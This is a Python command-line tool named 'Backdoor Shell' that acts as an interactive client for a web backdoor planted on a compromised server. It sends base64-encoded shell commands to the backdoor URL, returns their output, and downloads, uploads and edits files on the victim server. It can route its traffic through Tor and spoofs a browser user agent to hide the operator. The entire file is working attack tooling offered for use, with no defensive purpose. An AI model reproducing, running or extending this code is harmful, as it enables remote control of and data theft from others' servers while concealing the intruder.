# -*- coding: utf-8 -*-
"""Backdoor Shell"""
import argparse
import base64
import io
import logging
import os
import random
import string
import subprocess
import sys
import tempfile
from cmd import Cmd
from typing import Optional, Sequence, Union

import requests

try:
    import readline
except ImportError:
    readline = None

__version__ = '0.1.5'
__author__ = 'Sergey M <yamldeveloper@proton.me>'
__description__ = __doc__

BANNER = r"""
 ____             _     ____  _          _ _
| __ )  __ _  ___| | __/ ___|| |__   ___| | |
|  _ \ / _` |/ __| |/ /\___ \| '_ \ / _ \ | |
| |_) | (_| | (__|   <  ___) | | | |  __/ | |
|____/ \__,_|\___|_|\_\|____/|_| |_|\___|_|_|
v{} by s3rgeym

Type '?' or 'help' for more information.
""".format(
    __version__
)

EDITOR = os.environ.get('EDITOR', 'vim')

HISTFILE = os.path.expanduser('~/.backshell_history')
HISTFILE_SIZE = 1000

PROXY_MAPPING = {'tor': 'socks5://localhost:9050'}

CHECK_IP_URL = 'https://api.ipify.org'

DEFAULT_CMD_PARAM = 'c'
DEFAULT_UPLOAD_CHUNK_SIZE = 1_000_000
DEFAULT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.50'


def rand_chars(
    length: int = 8, chars: str = string.ascii_letters + string.digits
) -> str:
    return ''.join(random.choice(chars) for _ in range(length))


class BackShell(Cmd):
    intro = BANNER
    prompt = 'backshell> '

    def __init__(
        self,
        url: str,
        *,
        cmd_param: str = DEFAULT_CMD_PARAM,
        cwd: Optional[str] = None,
        nohistory: bool = False,
        proxy: Optional[str] = None,
        session: Optional[requests.Session] = None,
        upload_chunk_size: int = DEFAULT_UPLOAD_CHUNK_SIZE,
        user_agent: Optional[str] = None,
    ) -> None:
        super().__init__()
        self.url = url
        self.cmd_param = cmd_param
        self.cwd = cwd
        self.nohistory = nohistory
        self.upload_chunk_size = upload_chunk_size
        if not session:
            session = requests.session()
        if user_agent:
            session.headers.update({'User-Agent': user_agent})
        if proxy:
            proxy = PROXY_MAPPING.get(proxy, proxy)
            session.proxies.update({'http': proxy, 'https': proxy})
        self.session = session

    def emptyline(self) -> None:
        pass

    def do_exit(self, line: str) -> bool:
        "exit"
        return True

    def do_quit(self, line: str) -> bool:
        "exit"
        return self.do_exit(line)

    def do_q(self, line: str) -> bool:
        "exit"
        return self.do_exit(line)

    def do_EOF(self, line: str) -> bool:
        "exit"
        return self.do_exit(line)

    def do_client_ip(self, line: str) -> None:
        "show your ip"
        try:
            r = self.session.get(CHECK_IP_URL)
            print(r.text)
        except Exception as e:
            logging.error(e)

    def do_server_ip(self, line: str) -> None:
        "show server ip"
        try:
            output = self.exploit('curl -s "{}"'.format(CHECK_IP_URL))
            print(output)
        except Exception as e:
            logging.error(e)

    def exploit(self, command: str) -> str:
        redirect = '2>&1'
        # BAD: nohup command & 2>&1
        # GOOD: nohup command 2>&1 &
        if command.endswith('&'):
            command = command[:-1] + redirect + ' &'
        else:
            command += ' ' + redirect
        if self.cwd:
            command = 'cd {}; '.format(self.cwd) + command
        logging.debug(
            command
            if len(command) <= 255
            else command[:127] + '...' + command[-130:]
        )
        encoded = base64.b64encode(command.encode()).decode()
        # try:
        r: requests.Response = self.session.post(
            self.url, {self.cmd_param: encoded}
        )
        return r.text
        # except Exception as ex:
        #     logging.error(ex)

    def download(self, remote_path: str, writable: io.RawIOBase) -> int:
        encoded = self.exploit('base64 {}'.format(remote_path))
        contents = base64.b64decode(encoded)
        try:
            return writable.write(contents)
        finally:
            writable.flush()

    def do_download(self, arg: str) -> None:
        "download file from server"
        try:
            filename = '{}.{}'.format(rand_chars(4), os.path.basename(arg))
            with open(filename, 'wb') as fp:
                self.download(arg, fp)
                print('Saved as', filename)
        except Exception as e:
            logging.error(e)

    def upload(self, readable: io.RawIOBase, remote_path: str) -> None:
        append = False
        # У шелла есть ограничения на максмальную длину строки
        # см. getconf ARG_MAX
        while (chunk := readable.read(self.upload_chunk_size)) :
            encoded = base64.b64encode(chunk).decode()
            result = self.exploit(
                'echo "{}" | base64 -d {} {}'.format(
                    encoded, '>>' if append else '>', remote_path
                )
            )
            # logging.debug(result)
            assert result == ''
            append = True

    def do_upload(self, arg: str) -> None:
        "upload local file to server"
        try:
            filename = os.path.expanduser(arg)
            with open(filename, 'rb') as fp:
                self.upload(fp, os.path.basename(filename))
        except Exception as e:
            logging.error(e)

    def do_edit(self, arg: str) -> None:
        "edit file on server"
        try:
            _, ext = os.path.splitext(arg)
            with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as temp:
                # скачиваем файл
                self.download(arg, temp)
                modified = os.stat(temp.fileno()).st_mtime
                # редактируем
                subprocess.call([EDITOR, temp.name])
                # если время модфикации файла не изменилось не гоняем лишние байты
                # по сети
                if os.stat(temp.fileno()).st_mtime > modified:
                    temp.seek(0)
                    # загружаем на сервер
                    self.upload(temp, arg)
                    print('Saved')
                else:
                    print('Not modified')
                os.unlink(temp.name)
        except Exception as e:
            logging.error(e)

    def do_cwd(self, arg: str) -> None:
        "change working directory"
        self.cwd = arg

    def default(self, command: str) -> None:
        try:
            print(self.exploit(command))
        except Exception as e:
            logging.error(e)

    def preloop(self) -> None:
        if not self.nohistory and readline and os.path.exists(HISTFILE):
            readline.read_history_file(HISTFILE)

    def postloop(self) -> None:
        if not self.nohistory and readline:
            readline.set_history_length(HISTFILE_SIZE)
            readline.write_history_file(HISTFILE)


def main(argv: Sequence[str] = sys.argv[1:]) -> None:
    parser = argparse.ArgumentParser(
        description=__description__,
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument('url', help='backdoor url')
    parser.add_argument(
        '-d',
        '--debug',
        action='store_true',
        default=False,
        help='show more verbose output',
    )
    parser.add_argument(
        '-c', '--command', '--cmd', help='execute one command and exit',
    )
    parser.add_argument(
        '--cmd-param',
        default=DEFAULT_CMD_PARAM,
        help='cmd request param name',
    )
    parser.add_argument(
        '--cwd', help='change working directory',
    )
    parser.add_argument(
        '--nohistory',
        '--nohist',
        action='store_true',
        default=False,
        help='no save history',
    )
    parser.add_argument(
        '--proxy',
        help='proxy, eg.: "socks5://localhost:9050" or simple "tor"',
    )
    parser.add_argument(
        '--user-agent', '--ua', default=DEFAULT_USER_AGENT, help='user agent',
    )
    parser.add_argument(
        '--upload-chunk-size',
        default=DEFAULT_UPLOAD_CHUNK_SIZE,
        help='upload chunk size',
        type=int,
    )
    parser.add_argument(
        '-v', '--version', action='version', version='v{__version__}'
    )
    args = parser.parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.WARNING,
        stream=sys.stderr,
    )
    if readline is None:
        logging.warning('readline not available')
    sh = BackShell(
        args.url,
        cmd_param=args.cmd_param,
        cwd=args.cwd,
        nohistory=args.nohistory,
        proxy=args.proxy,
        upload_chunk_size=args.upload_chunk_size,
        user_agent=args.user_agent,
    )
    try:
        if args.command:
            sh.onecmd(args.command)
        else:
            sh.cmdloop()
    except KeyboardInterrupt:
        logging.critical('bye')
